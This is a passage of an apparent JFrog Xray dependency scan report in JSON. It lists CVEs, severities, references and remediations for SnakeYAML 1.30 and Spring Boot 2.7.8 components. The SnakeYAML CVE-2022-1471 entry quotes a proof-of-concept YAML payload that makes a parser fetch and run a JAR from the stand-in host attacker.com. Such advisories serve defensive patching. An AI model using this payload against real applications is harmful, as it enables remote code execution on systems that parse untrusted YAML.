          "https://github.com/pytorch/serve/security/advisories/GHSA-4mqg-h5jf-j9m7",
          "https://bitbucket.org/snakeyaml/snakeyaml/issues/561/cve-2022-1471-vulnerability-in#comment-64581479",
          "https://security.netapp.com/advisory/ntap-20240621-0006/",
          "https://security.netapp.com/advisory/ntap-20230818-0015/",
          "https://nvd.nist.gov/vuln/detail/CVE-2022-1471"
        ],
        "extended_information": {
          "short_description": "A design problem in SnakeYAML leads to remote code execution when deserializing untrusted YAML data.",
          "full_description": "[SnakeYAML](https://bitbucket.org/snakeyaml/snakeyaml/) is a popular Java-based YAML parsing that provides a high-level API for serialization and deserialization of YAML documents.\n\nIt was discovered that a crafted YAML file containing a Java `Constructor` can lead to remote code execution due to deserialization.\n\nSnakeYaml's Constructor class, which inherits from SafeConstructor, allows any class type to be deserialized. A ConstructorException is thrown, but only after the malicious\npayload is deserialized.\n\nTo exploit this issue, an attacker must find remote input that propagates into the `Yaml.load()` method. \nThe attacker must deserialize a [Java \"gadget\" class](http://frohoff.github.io/owaspsd-deserialize-my-shorts/) that's available in the application's classpath in order to achieve code execution via the deserialization. However - there are gadget classes that are available by default such as the built-in `javax.script.ScriptEngineManager`.\n\nA remote code execution PoC example, using the Java built-in class `javax.script.ScriptEngineManager`:\n```\nString strYaml = \"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader \"\n                + \"[[!!java.net.URL [\\\"http://attacker.com\\\"]]]]\";;\nYaml yaml = new Yaml(new Constructor(Foo.class));\nyaml.load(strYaml);\n```\nThe PoC will run an arbitrary JAR file supplied from `http://attacker.com`. Note that even though `Constructor` receives a specific class type (`Foo.class`), any gadget class can be deserialized.\n\nNote that the vulnerability will not apply to applications that use the (non-default) `SafeConstructor`",
          "jfrog_research_severity": "Critical",
          "jfrog_research_severity_reasons": [
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "An attacker must find remote input that propagates into the `Yaml.load()` method. The `Yaml` class must be initialized either with no arguments (default initialization) or with a `Constructor` instance. The vulnerability can still be exploited even if the `Constructor` instance is initialized with a specific class type.",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "Remote code execution."
            },
            {
              "name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
              "description": "It is highly likely that SnakeYAML will be used to parse externally-supplied YAML data. In addition, the vulnerability is exploitable when the `Yaml` class is initialized with default arguments."
            },
            {
              "name": "The issue has an exploit published",
              "description": "PoC demonstrates remote code execution."
            }
          ],
          "remediation": "##### Development mitigations\n\nUse the (non-default) `SafeConstructor` class to initialize the `Yaml` class -\n```\nLoaderOptions options = new LoaderOptions();\nYaml yaml = new Yaml(new SafeConstructor(options));\nString strYaml = Files.readString(Path.of(\"input_file\")); \nString parsed = yaml.load(strYaml);\n```\n\nNote that this class will only allow deserialization of [basic types](https://github.com/Thinkofname/snakeyaml/blob/master/src/main/java/org/yaml/snakeyaml/constructor/SafeConstructor.java#L52) such as Integers, Strings, Maps etc."
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2022-41854",
            "cvss_v3_score": "6.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
            "cwe": [
              "CWE-121",
              "CWE-787"
            ],
            "cwe_details": {
              "CWE-121": {
                "name": "Stack-based Buffer Overflow",
                "description": "A stack-based buffer overflow condition is a condition where the buffer being overwritten is allocated on the stack (i.e., is a local variable or, rarely, a parameter to a function)."
              },
              "CWE-787": {
                "name": "Out-of-bounds Write",
                "description": "The product writes data past the end, or before the beginning, of the intended buffer.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "1"
                  }
                ]
              }
            }
          }
        ],
        "summary": "Those using Snakeyaml to parse untrusted YAML files may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stack overflow. This effect may support a denial of service attack.",
        "severity": "Medium",
        "components": {
          "gav://org.yaml:snakeyaml:1.30": {
            "fixed_versions": [
              "[1.32]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-261206",
        "references": [
          "https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=50355",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/KSPAJ5Y45A4ZDION2KN5RDWLHK4XKY2J",
          "https://security.netapp.com/advisory/ntap-20240621-0006",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/3DDXEXXWAZGF5AVHIPGFPXIWL6TSMKJE/",
          "https://bitbucket.org/snakeyaml/snakeyaml/commits/e230a1758842beec93d28eddfde568c21774780a",
          "https://security.netapp.com/advisory/ntap-20240315-0009/",
          "https://nvd.nist.gov/vuln/detail/CVE-2022-41854",
          "https://bitbucket.org/snakeyaml/snakeyaml/issues/531",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/7MKE4XWRXTH32757H7QJU4ACS67DYDCR",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/7MKE4XWRXTH32757H7QJU4ACS67DYDCR",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/7MKE4XWRXTH32757H7QJU4ACS67DYDCR/",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/3DDXEXXWAZGF5AVHIPGFPXIWL6TSMKJE",
          "https://github.com/advisories/GHSA-w37g-rhq8-7m4j",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/KSPAJ5Y45A4ZDION2KN5RDWLHK4XKY2J",
          "https://security.netapp.com/advisory/ntap-20240621-0006/",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/KSPAJ5Y45A4ZDION2KN5RDWLHK4XKY2J/",
          "https://security.netapp.com/advisory/ntap-20240315-0009",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/3DDXEXXWAZGF5AVHIPGFPXIWL6TSMKJE"
        ],
        "extended_information": {
          "short_description": "Stack exhaustion in SnakeYAML leads to denial of service when parsing untrusted YAML data.",
          "full_description": "[SnakeYAML](https://bitbucket.org/snakeyaml/snakeyaml/) is a popular Java-based YAML parsing that provides a high-level API for serialization and deserialization of YAML documents.\n\nWhen loading a YAML document, SnakeYAML uses recursion to parse objects from the document.\n\nIt was discovered that a crafted YAML file containing a deeply nested YAML can lead to denial of service due to stack exhaustion.\nTo exploit this issue, an attacker must find remote input that propagates into the `Yaml.load()` method. Note that the issue can be exploited even if the `Yaml` class is initialized with a `SafeConstructor`:\n```\nYaml yaml = new Yaml(new SafeConstructor());\nyaml.load(external_data);\n```\n\nA PoC was published [here](https://bitbucket.org/snakeyaml/snakeyaml/issues/543/stackoverflow-oss-fuzz-50355)\n\nDespite the vulnerability being fixed and patched on SnakeYAML v1.32 or later, a non-default configuration (`setAllowRecursiveKeys(true);`) allows this issue to still be exploitable.\nHowever, such a configuration is very rare.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "An attacker must find remote input that propagates into the `Yaml.load()` method. Note that the issue can be exploited even if the `Yaml` class is initialized with a `SafeConstructor` or with a `Constructor` that accepts an explicit type only.\nOn patched versions, a non-default configuration must be used for the issue to be exploited.",
              "is_positive": true
            },
            {
              "name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
              "description": "It is highly likely that SnakeYAML will be used to parse externally-supplied YAML data."
            },
            {
              "name": "The issue has an exploit published",
              "description": "PoC demonstrates denial of service."
            }
          ],
          "remediation": "##### Development mitigations\n\nWrap SnakeYAML's `load` method with exception handling -\n```java\ntry {\n\tString parsed = yaml.load(strYaml);\n}\ncatch(StackOverflowError e) {\n\tSystem.err.println(\"ERROR: Stack limit reached\");\n}\n```"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2022-38752",
            "cvss_v3_score": "6.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
            "cwe": [
              "CWE-121",
              "CWE-787"
            ],
            "cwe_details": {
              "CWE-121": {
                "name": "Stack-based Buffer Overflow",
                "description": "A stack-based buffer overflow condition is a condition where the buffer being overwritten is allocated on the stack (i.e., is a local variable or, rarely, a parameter to a function)."
              },
              "CWE-787": {
                "name": "Out-of-bounds Write",
                "description": "The product writes data past the end, or before the beginning, of the intended buffer.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "1"
                  }
                ]
              }
            }
          }
        ],
        "summary": "Using snakeYAML to parse untrusted YAML files may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stack-overflow.",
        "severity": "Medium",
        "components": {
          "gav://org.yaml:snakeyaml:1.30": {
            "fixed_versions": [
              "[1.32]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-253427",
        "references": [
          "https://security.gentoo.org/glsa/202305-28",
          "https://github.com/advisories/GHSA-9w3m-gqgf-c4p9",
          "https://nvd.nist.gov/vuln/detail/CVE-2022-38752",
          "https://bitbucket.org/snakeyaml/snakeyaml/issues/531/stackoverflow-oss-fuzz-47081",
          "https://security.netapp.com/advisory/ntap-20240315-0009/",
          "https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=47081",
          "https://security.netapp.com/advisory/ntap-20240315-0009"
        ],
        "extended_information": {
          "short_description": "Stack exhaustion in SnakeYAML leads to denial of service when parsing untrusted YAML data.",
          "full_description": "[SnakeYAML](https://bitbucket.org/snakeyaml/snakeyaml/) is a popular Java-based YAML parsing that provides a high-level API for serialization and deserialization of YAML documents.\n\nIt was discovered that a crafted YAML file containing a short regular expression can lead to denial of service due to stack exhaustion.\nTo exploit this issue, an attacker must find remote input that propagates into the `Yaml.load()` method. Note that the issue can be exploited even if the `Yaml` class is initialized with a `SafeConstructor`:\n```\nYaml yaml = new Yaml(new SafeConstructor());\nyaml.load(external_data);\n```\n\nA PoC was published [here](https://bitbucket.org/snakeyaml/snakeyaml/issues/531/stackoverflow-oss-fuzz-47081)",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
              "description": "It is highly likely that SnakeYAML will be used to parse externally-supplied YAML data"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "An attacker must find remote input that propagates into the `Yaml.load()` method. Note that the issue can be exploited even if the `Yaml` class is initialized with a `SafeConstructor` or with a `Constructor` that accepts an explicit type only.",
              "is_positive": true
            },
            {
              "name": "The issue has an exploit published",
              "description": "PoC demonstrates denial of service"
            }
          ],
          "remediation": "##### Development mitigations\n\nWrap SnakeYAML's `load` method with exception handling -\n```java\ntry {\n\tString parsed = yaml.load(strYaml);\n}\ncatch(StackOverflowError e) {\n\tSystem.err.println(\"ERROR: Stack limit reached\");\n}\n```"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2022-38749",
            "cvss_v3_score": "6.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
            "cwe": [
              "CWE-121",
              "CWE-787"
            ],
            "cwe_details": {
              "CWE-121": {
                "name": "Stack-based Buffer Overflow",
                "description": "A stack-based buffer overflow condition is a condition where the buffer being overwritten is allocated on the stack (i.e., is a local variable or, rarely, a parameter to a function)."
              },
              "CWE-787": {
                "name": "Out-of-bounds Write",
                "description": "The product writes data past the end, or before the beginning, of the intended buffer.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "1"
                  }
                ]
              }
            }
          }
        ],
        "summary": "Using snakeYAML to parse untrusted YAML files may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stackoverflow.",
        "severity": "Medium",
        "components": {
          "gav://org.yaml:snakeyaml:1.30": {
            "fixed_versions": [
              "[1.31]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-253430",
        "references": [
          "https://bitbucket.org/snakeyaml/snakeyaml/issues/525/got-stackoverflowerror-for-many-open",
          "https://github.com/advisories/GHSA-c4r9-r8fh-9vj2",
          "https://nvd.nist.gov/vuln/detail/CVE-2022-38749",
          "https://security.gentoo.org/glsa/202305-28",
          "https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=47024",
          "https://arxiv.org/pdf/2306.05534.pdf",
          "https://security.netapp.com/advisory/ntap-20240315-0010/",
          "https://lists.debian.org/debian-lts-announce/2022/10/msg00001.html",
          "https://security.netapp.com/advisory/ntap-20240315-0010"
        ],
        "extended_information": {
          "short_description": "Stack exhaustion in SnakeYAML leads to denial of service when parsing untrusted YAML data.",
          "full_description": "[SnakeYAML](https://bitbucket.org/snakeyaml/snakeyaml/) is a popular Java-based YAML parsing that provides a high-level API for serialization and deserialization of YAML documents.\n\nIt was discovered that a crafted YAML file containing a deeply nested expression can lead to denial of service due to stack exhaustion.\nTo exploit this issue, an attacker must find remote input that propagates into the `Yaml.load()` method. Note that the issue can be exploited even if the `Yaml` class is initialized with a `SafeConstructor`:\n```\nYaml yaml = new Yaml(new SafeConstructor());\nyaml.load(external_data);\n```\n\nA crashing PoC was published [here](https://bitbucket.org/snakeyaml/snakeyaml/issues/525/got-stackoverflowerror-for-many-open)",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
              "description": "It is highly likely that SnakeYAML will be used to parse externally-supplied YAML data"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "An attacker must find remote input that propagates into the `Yaml.load()` method. Note that the issue can be exploited even if the `Yaml` class is initialized with a `SafeConstructor` or with a `Constructor` that accepts an explicit type only.",
              "is_positive": true
            },
            {
              "name": "The issue has an exploit published",
              "description": "PoC demonstrates denial of service"
            }
          ],
          "remediation": "##### Development mitigations\n\nWrap SnakeYAML's `load` method with exception handling -\n```java\ntry {\n\tString parsed = yaml.load(strYaml);\n}\ncatch(StackOverflowError e) {\n\tSystem.err.println(\"ERROR: Stack limit reached\");\n}\n```"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2022-38750",
            "cvss_v3_score": "5.5",
            "cvss_v3_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
            "cwe": [
              "CWE-121",
              "CWE-787"
            ],
            "cwe_details": {
              "CWE-121": {
                "name": "Stack-based Buffer Overflow",
                "description": "A stack-based buffer overflow condition is a condition where the buffer being overwritten is allocated on the stack (i.e., is a local variable or, rarely, a parameter to a function)."
              },
              "CWE-787": {
                "name": "Out-of-bounds Write",
                "description": "The product writes data past the end, or before the beginning, of the intended buffer.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "1"
                  }
                ]
              }
            }
          }
        ],
        "summary": "Using snakeYAML to parse untrusted YAML files may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stackoverflow.",
        "severity": "Medium",
        "components": {
          "gav://org.yaml:snakeyaml:1.30": {
            "fixed_versions": [
              "[1.31]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-253429",
        "references": [
          "https://security.netapp.com/advisory/ntap-20240315-0010",
          "https://github.com/advisories/GHSA-hhhw-99gj-p3c3",
          "https://security.gentoo.org/glsa/202305-28",
          "https://nvd.nist.gov/vuln/detail/CVE-2022-38750",
          "https://security.netapp.com/advisory/ntap-20240315-0010/",
          "https://lists.debian.org/debian-lts-announce/2022/10/msg00001.html",
          "https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=47027",
          "https://bitbucket.org/snakeyaml/snakeyaml/issues/526/stackoverflow-oss-fuzz-47027"
        ],
        "extended_information": {
          "short_description": "Stack exhaustion in SnakeYAML leads to denial of service when parsing untrusted YAML data.",
          "full_description": "[SnakeYAML](https://bitbucket.org/snakeyaml/snakeyaml/) is a popular Java-based YAML parsing that provides a high-level API for serialization and deserialization of YAML documents.\n\nWhen loading a YAML document, SnakeYAML uses recursion to parse objects from the document.\n\nIt was discovered that a crafted YAML file containing a deeply nested YAML can lead to denial of service due to stack exhaustion.\nTo exploit this issue, an attacker must find remote input that propagates into the `Yaml.load()` method. Note that the issue can be exploited even if the `Yaml` class is initialized with a `SafeConstructor`:\n```\nYaml yaml = new Yaml(new SafeConstructor());\nyaml.load(external_data);\n```\n\nA PoC was published [here](https://bitbucket.org/snakeyaml/snakeyaml/issues/526/stackoverflow-oss-fuzz-47027)",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
              "description": "It is highly likely that SnakeYAML will be used to parse externally-supplied YAML data."
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "An attacker must find remote input that propagates into the `Yaml.load()` method. Note that the issue can be exploited even if the `Yaml` class is initialized with a `SafeConstructor` or with a `Constructor` that accepts an explicit type only.",
              "is_positive": true
            },
            {
              "name": "The issue has an exploit published",
              "description": "PoC demonstrates denial of service."
            }
          ],
          "remediation": "##### Development mitigations\n\nWrap SnakeYAML's `load` method with exception handling -\n```java\ntry {\n\tString parsed = yaml.load(strYaml);\n}\ncatch(StackOverflowError e) {\n\tSystem.err.println(\"ERROR: Stack limit reached\");\n}\n```"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2022-38751",
            "cvss_v3_score": "6.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
            "cwe": [
              "CWE-121",
              "CWE-787"
            ],
            "cwe_details": {
              "CWE-121": {
                "name": "Stack-based Buffer Overflow",
                "description": "A stack-based buffer overflow condition is a condition where the buffer being overwritten is allocated on the stack (i.e., is a local variable or, rarely, a parameter to a function)."
              },
              "CWE-787": {
                "name": "Out-of-bounds Write",
                "description": "The product writes data past the end, or before the beginning, of the intended buffer.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "1"
                  }
                ]
              }
            }
          }
        ],
        "summary": "Using snakeYAML to parse untrusted YAML files may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stackoverflow.",
        "severity": "Medium",
        "components": {
          "gav://org.yaml:snakeyaml:1.30": {
            "fixed_versions": [
              "[1.31]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-253428",
        "references": [
          "https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=47039",
          "https://github.com/advisories/GHSA-98wm-3w3q-mw94",
          "https://lists.debian.org/debian-lts-announce/2022/10/msg00001.html",
          "https://nvd.nist.gov/vuln/detail/CVE-2022-38751",
          "https://security.netapp.com/advisory/ntap-20240315-0010",
          "https://security.netapp.com/advisory/ntap-20240315-0010/",
          "https://bitbucket.org/snakeyaml/snakeyaml/src/master/src/test/java/org/yaml/snakeyaml/issues/issue530/Fuzzy47039Test.java",
          "https://security.gentoo.org/glsa/202305-28",
          "https://bitbucket.org/snakeyaml/snakeyaml/issues/530/stackoverflow-oss-fuzz-47039"
        ],
        "extended_information": {
          "short_description": "Stack exhaustion in SnakeYAML leads to denial of service when parsing untrusted YAML data.",
          "full_description": "[SnakeYAML](https://bitbucket.org/snakeyaml/snakeyaml/) is a popular Java-based YAML parsing that provides a high-level API for serialization and deserialization of YAML documents.\n\nIt was discovered that a crafted YAML file containing an extremely long regular expression can lead to denial of service due to stack exhaustion.\nTo exploit this issue, an attacker must find remote input that propagates into the `Yaml.load()` method. Note that the issue can be exploited even if the `Yaml` class is initialized with a `SafeConstructor`:\n```\nYaml yaml = new Yaml(new SafeConstructor());\nyaml.load(external_data);\n```\n\nA PoC was published [here](PoC demonstrates denial of service)",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
              "description": "It is highly likely that SnakeYAML will be used to parse externally-supplied YAML data"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "An attacker must find remote input that propagates into the `Yaml.load()` method. Note that the issue can be exploited even if the `Yaml` class is initialized with a `SafeConstructor` or with a `Constructor` that accepts an explicit type only.",
              "is_positive": true
            },
            {
              "name": "The issue has an exploit published",
              "description": "PoC demonstrates denial of service"
            }
          ],
          "remediation": "##### Development mitigations\n\nWrap SnakeYAML's `load` method with exception handling -\n```java\ntry {\n\tString parsed = yaml.load(strYaml);\n}\ncatch(StackOverflowError e) {\n\tSystem.err.println(\"ERROR: Stack limit reached\");\n}\n```"
        }
      }
    ],
    "component_id": "gav://org.yaml:snakeyaml:1.30",
    "package_type": "maven",
    "status": "completed"
  },
  {
    "scan_id": "9a192558-815b-45d2-7727-f0d09063770a",
    "component_id": "gav://org.springframework:spring-aop:5.3.25",
    "package_type": "maven",
    "status": "completed"
  },
  {
    "scan_id": "a2ba32b5-5345-4032-55df-46d4d28ed53e",
    "component_id": "gav://org.springframework:spring-beans:5.3.25",
    "package_type": "maven",
    "status": "completed"
  },
  {
    "scan_id": "d5385b5f-7ee4-400c-5462-21116823ebb0",
    "vulnerabilities": [
      {
        "cves": [
          {
            "cve": "CVE-2025-22235",
            "cvss_v3_score": "7.3",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
            "cwe": [
              "CWE-862",
              "CWE-20"
            ],
            "cwe_details": {
              "CWE-20": {
                "name": "Improper Input Validation",
                "description": "The product receives input or data, but it does not validate or incorrectly validates that the input has the properties that are required to process the data safely and correctly.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "6"
                  }
                ]
              },
              "CWE-862": {
                "name": "Missing Authorization",
                "description": "The product does not perform an authorization check when an actor attempts to access a resource or perform an action.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "11"
                  }
                ]
              }
            }
          }
        ],
        "summary": "EndpointRequest.to() creates a matcher for null/** if the actuator endpoint, for which the EndpointRequest has been created, is disabled or not exposed.\n\nYour application may be affected by this if all the following conditions are met:\n\n  *  You use Spring Security\n  *  EndpointRequest.to() has been used in a Spring Security chain configuration\n  *  The endpoint which EndpointRequest references is disabled or not exposed via web\n  *  Your application handles requests to /null and this path needs protection\n\n\nYou are not affected if any of the following is true:\n\n  *  You don't use Spring Security\n  *  You don't use EndpointRequest.to()\n  *  The endpoint which EndpointRequest.to() refers to is enabled and is exposed\n  *  Your application does not handle requests to /null or this path does not need protection",
        "severity": "High",
        "components": {
          "gav://org.springframework.boot:spring-boot:2.7.8": {
            "fixed_versions": [
              "[3.3.11]",
              "[3.4.5]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.8"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-695110",
        "references": [
          "https://security.netapp.com/advisory/ntap-20250516-0010",
          "https://github.com/advisories/GHSA-rc42-6c7j-7h5r",
          "https://nvd.nist.gov/vuln/detail/CVE-2025-22235",
          "https://security.netapp.com/advisory/ntap-20250516-0010/",
          "https://spring.io/security/cve-2025-22235"
        ]
      }
    ],
    "component_id": "gav://org.springframework.boot:spring-boot:2.7.8",
    "package_type": "maven",
    "status": "completed"
  },
  {
    "scan_id": "e3940a95-fd13-4f17-58fd-10b4f33b7b22",
    "vulnerabilities": [
      {
        "cves": [
          {
            "cve": "CVE-2023-20883",
            "cvss_v3_score": "7.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cwe": [
              "CWE-400"
            ],
            "cwe_details": {
              "CWE-400": {
                "name": "Uncontrolled Resource Consumption",
                "description": "The product does not properly control the allocation and maintenance of a limited resource, thereby enabling an actor to influence the amount of resources consumed, eventually leading to the exhaustion of available resources."
              }
            }
          }
        ],
        "summary": "In Spring Boot versions 3.0.0 - 3.0.6, 2.7.0 - 2.7.11, 2.6.0 - 2.6.14, 2.5.0 - 2.5.14 and older unsupported versions, there is potential for a denial-of-service (DoS) attack if Spring MVC is used together with a reverse proxy cache.",
        "severity": "High",
        "components": {
          "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.8": {
            "fixed_versions": [
              "[2.5.15]",
              "[2.6.15]",
              "[2.7.12]",
              "[3.0.7]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.8"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-520740",
        "references": [
          "https://github.com/spring-projects/spring-boot/releases/tag/v2.5.15",
          "https://github.com/spring-projects/spring-boot/releases/tag/v2.7.12",
          "https://github.com/spring-projects/spring-boot/releases/tag/v2.6.15",
          "https://github.com/spring-projects/spring-boot/issues/35552",
          "https://github.com/spring-projects/spring-boot/commit/418dd1ba5bdad79b55a043000164bfcbda2acd78",
          "https://spring.io/security/cve-2023-20883",
          "https://nvd.nist.gov/vuln/detail/CVE-2023-20883",
          "https://security.netapp.com/advisory/ntap-20230703-0008/",
          "https://github.com/spring-projects/spring-boot"
        ],
        "extended_information": {
          "short_description": "A design problem in Spring Boot may lead to denial of service when using the welcome page support.",
          "full_description": "[Spring Boot](https://spring.io/) is an open-source Java framework that simplifies the development of stand-alone, production-grade Spring-based applications by providing a pre-configured environment with a range of features and capabilities. It eliminates the need for manual configuration and enables developers to focus on writing business logic rather than setting up infrastructure.\nAn issue has been discovered in the way that Spring Boot serves a welcome page.\nThe welcome page is an automatically generated page that is served when accessing the web root `/` or `index.html`.\nIf an acceptable response cannot be produced (for example, an `Accept` header in the client's request is not present), the welcome page results in a 404 error.\nThis issue could lead to a denial-of-service when the application is used with a reverse proxy cache that caches these error responses. Specifically - after an attacker causes the 404 response to get cached, any other clients that access the welcome page (or web root) will also get a 404 response.\n\nNote that the vulnerability only affects applications that meet *all* of the following requirements:\n\n* `Spring MVC` auto-configuration is used in the application, using one of these class annotations: `@EnableAutoConfiguration` or `@SpringBootApplication`.\n\n* The application utilizes Spring Boot's welcome page feature, which can be static or templated. This is enabled by default but can be disabled by excluding `WelcomePageHandlerMapping` from the Spring context, or by overwriting the root `/` with a custom handler (`@GetMapping(\"/\")`).\n\n* The application is set up behind a proxy that caches 404 responses.",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue cannot result in a severe impact (such as remote code execution)",
              "description": "Partial denial of service (DoS of the welcome page / root page only).",
              "is_positive": true
            },
            {
              "name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
              "description": "The CVSS does not reflect the contextual prerequisites required to exploit the vulnerability.",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The application must have Spring MVC auto-configuration enabled, and also be deployed behind a proxy that caches `404 Not Found` HTTP responses.\nAlso, the application must make use of the welcome / landing page support.",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nConfigure the reverse proxy not to cache 404 responses and/or not to cache responses to requests to the root (/) of the application."
        }
      }
    ],
    "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.8",
    "package_type": "maven",
    "status": "completed"
  },
  {
    "scan_id": "27aa2bb4-149f-409c-686c-046f86dc54eb",
    "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.8",
    "package_type": "maven",
    "status": "completed"
  },
  {
    "scan_id": "cf1f7b3d-417b-45bc-504e-7bd3d7faa566",
    "component_id": "gav://org.springframework.boot:spring-boot-starter-json:2.7.8",
    "package_type": "maven",
    "status": "completed"
  },
  {
    "scan_id": "4e181c8f-eeed-4b0c-506e-cb9481972a14",
    "component_id": "gav://org.springframework.boot:spring-boot-starter-logging:2.7.8",
    "package_type": "maven",
    "status": "completed"
  },
  {
    "scan_id": "00247ce5-2663-4667-7d34-7dd613791910",
    "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.8",
    "package_type": "maven",
    "status": "completed"
  },
  {
    "scan_id": "d26ad12a-ebdd-4b7f-4e39-99227c7d4e25",
    "vulnerabilities": [
      {
        "cves": [
          {
            "cve": "CVE-2025-22233",
            "cvss_v3_score": "3.1",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N",
            "cwe": [
              "CWE-20"
            ],
            "cwe_details": {
              "CWE-20": {
                "name": "Improper Input Validation",
                "description": "The product receives input or data, but it does not validate or incorrectly validates that the input has the properties that are required to process the data safely and correctly.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "6"
                  }
                ]
              }
            }
          }
        ],
